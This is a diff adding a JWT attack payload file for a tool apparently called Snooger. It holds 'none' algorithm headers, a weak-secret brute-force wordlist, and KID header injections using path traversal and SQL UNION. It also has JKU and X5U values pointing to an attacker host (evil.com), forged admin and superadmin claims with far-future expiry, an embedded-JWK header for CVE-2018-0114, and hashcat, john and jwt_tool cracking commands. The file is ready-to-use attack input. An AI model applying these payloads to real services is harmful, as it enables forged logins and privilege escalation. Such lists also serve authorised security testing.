@@ -1,0 +1,129 @@
+# Snooger JWT Attack Payloads and Patterns
+# Categories: None Algorithm, Weak Secrets, Algorithm Confusion, KID Injection, JKU/X5U
+# =====================================================================================
+
+# === None Algorithm Variants ===
+{"alg":"none","typ":"JWT"}
+{"alg":"None","typ":"JWT"}
+{"alg":"NONE","typ":"JWT"}
+{"alg":"nOnE","typ":"JWT"}
+{"alg":"noNe","typ":"JWT"}
+{"alg":"NonE","typ":"JWT"}
+{"alg":"nOne","typ":"JWT"}
+
+# === Common Weak Secrets (for HS256/HS384/HS512 brute force) ===
+secret
+password
+123456
+12345678
+1234567890
+admin
+jwt
+token
+key
+qwerty
+test
+default
+changeme
+change-me
+passw0rd
+letmein
+test123
+admin123
+welcome
+login
+development
+staging
+production
+private
+private_key
+super_secret
+my_secret
+application
+server
+backend
+frontend
+your-256-bit-secret
+your-384-bit-secret
+your-512-bit-secret
+supersecretkey
+mysecretkey
+secretkey
+jwt_secret
+jwt-secret
+jwt_key
+jwt-key
+api-key
+api_key
+api_secret
+apikey
+app_secret
+app-secret
+appsecret
+auth_secret
+authorization
+bearer
+hmac
+hmac_key
+hmac-secret
+hs256-key
+master_key
+signing_key
+signing-key
+token_secret
+access_token
+refresh_token
+
+# === KID (Key ID) Header Injection ===
+{"alg":"HS256","kid":"/dev/null","typ":"JWT"}
+{"alg":"HS256","kid":"../../dev/null","typ":"JWT"}
+{"alg":"HS256","kid":"/proc/sys/kernel/hostname","typ":"JWT"}
+{"alg":"HS256","kid":"path/to/nothing","typ":"JWT"}
+{"alg":"HS256","kid":"' UNION SELECT 'secret' -- ","typ":"JWT"}
+{"alg":"HS256","kid":"' UNION SELECT 'AABB' -- ","typ":"JWT"}
+{"alg":"HS256","kid":"redis://127.0.0.1/0","typ":"JWT"}
+{"alg":"HS256","kid":"http://evil.com/key","typ":"JWT"}
+{"alg":"HS256","kid":"../../../../../../etc/hostname","typ":"JWT"}
+
+# === Algorithm Confusion (RS256 → HS256) ===
+# Attack: change alg from RS256 to HS256 and sign with RSA public key
+{"alg":"HS256","typ":"JWT"}
+# Sign with server's RSA public key as HMAC secret
+
+# === JKU (JWK Set URL) ===
+{"alg":"RS256","jku":"http://evil.com/.well-known/jwks.json","typ":"JWT"}
+{"alg":"RS256","jku":"https://evil.com/jwks.json","kid":"evil-key-1","typ":"JWT"}
+
+# === X5U (X.509 URL) ===
+{"alg":"RS256","x5u":"http://evil.com/cert.pem","typ":"JWT"}
+{"alg":"RS256","x5u":"https://evil.com/chain.crt","typ":"JWT"}
+
+# === X5C (X.509 Certificate Chain) ===
+# Inject self-signed certificate chain in x5c header
+
+# === Payload Tampering Claims ===
+{"sub":"admin","role":"admin","iat":1700000000,"exp":9999999999}
+{"sub":"1","role":"superadmin","admin":true,"iat":1700000000,"exp":9999999999}
+{"sub":"admin","is_admin":true,"privilege":"root","iat":1700000000,"exp":9999999999}
+{"sub":"admin","scope":"admin:all users:all","iat":1700000000,"exp":9999999999}
+{"sub":"attacker","user_type":"administrator","iat":1700000000,"exp":9999999999}
+
+# === Expiration Bypass ===
+{"sub":"admin","iat":1700000000,"exp":99999999999}
+# Remove exp claim entirely
+# Set exp to far future
+# Set nbf (not-before) to past
+
+# === Empty/Null Signature ===
+# token.payload.
+# token.payload.AA==
+# truncated signature
+
+# === CVE-2018-0114 (node-jose) ===
+# Embed JWK in header
+{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"},"typ":"JWT"}
+
+# === JWT Crack Command Reference ===
+# hashcat -a 0 -m 16500 jwt.txt wordlist.txt
+# john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256
+# jwt_tool TOKEN -C -d wordlist.txt
